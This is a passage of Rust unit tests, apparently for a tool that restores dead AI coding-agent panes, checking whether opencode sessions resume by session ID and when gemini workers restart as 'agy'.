            &[a.clone()],
            &env_exists(&no_sessions),
            &RestoreOpts::default(),
        );
        assert_eq!(plan.items.len(), 1, "{plan:?}");
        assert_eq!(plan.items[0].cmd, "opencode --auto");

        let resume = RestoreOpts {
            resume: true,
            ..RestoreOpts::default()
        };
        let plan = plan_restore(&[a], &env_exists(&no_sessions), &resume);
        assert_eq!(
            plan.items.len(),
            1,
            "a lost conversation still comes back fresh"
        );
        assert_eq!(plan.items[0].cmd, "opencode --auto");
        assert_eq!(
            plan.skipped,
            ["opencode-1: the conversation cannot be revived \
              (an opencode session with no recorded session ID \
              (is the plugin installed? herdr-tower init)) — starting fresh"],
            "the limit named is this tool's, not the CLI's"
        );
    }

    /// With the session ID its plugin reported, an opencode pane comes back
    /// in that conversation.
    #[test]
    fn an_opencode_pane_with_a_session_id_is_resumed() {
        let d = tempfile::tempdir().unwrap();
        let mut a = dead_agent("opencode-1", "opencode", "s", 0, d.path().to_str().unwrap());
        a.session_id = "ses_f2faf319bffePHplqq5y5vQn6X".into();
        let resume = RestoreOpts {
            resume: true,
            ..RestoreOpts::default()
        };
        let plan = plan_restore(&[a], &env_exists(&no_sessions), &resume);
        assert_eq!(plan.items.len(), 1, "{plan:?}");
        assert_eq!(
            plan.items[0].cmd,
            "opencode --auto --session 'ses_f2faf319bffePHplqq5y5vQn6X'"
        );
    }

    /// An unset gemini root must not turn into a relative-path probe of whatever
    /// directory the process happens to be in — `Path::new("").join("x")` is the
    /// relative path `x`, and `exists()` on it answers about the working
    /// directory.
    #[test]
    fn an_unset_gemini_root_answers_the_stock_command() {
        let a = dead_agent("gemini-1", "gemini", "gem", 0, "/tmp");
        assert_eq!(fresh_command(&a, &ResumePaths::default()), "gemini");
    }

    /// A gemini worker restarts as `agy` wherever there is a trace of it, which
    /// is the rule `wt new` follows too: two ways of starting one vendor would be
    /// two different agents to the user.
    #[test]
    fn a_gemini_worker_restarts_as_agy_where_agy_is_installed() {
        let d = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(d.path().join("antigravity-cli")).unwrap();
        let roots = ResumePaths {
            gemini_dir: d.path().to_path_buf(),
            ..ResumePaths::default()
        };
        let a = dead_agent("gemini-1", "gemini", "gem", 0, "/tmp");
        assert_eq!(fresh_command(&a, &roots), "agy");
    }

    #[test]
    fn the_tab_name_is_the_folders_own_last_component() {
        assert_eq!(base_name("/srv/work/herdr-tower"), "herdr-tower");
        assert_eq!(base_name("herdr-tower"), "herdr-tower");
    }
}
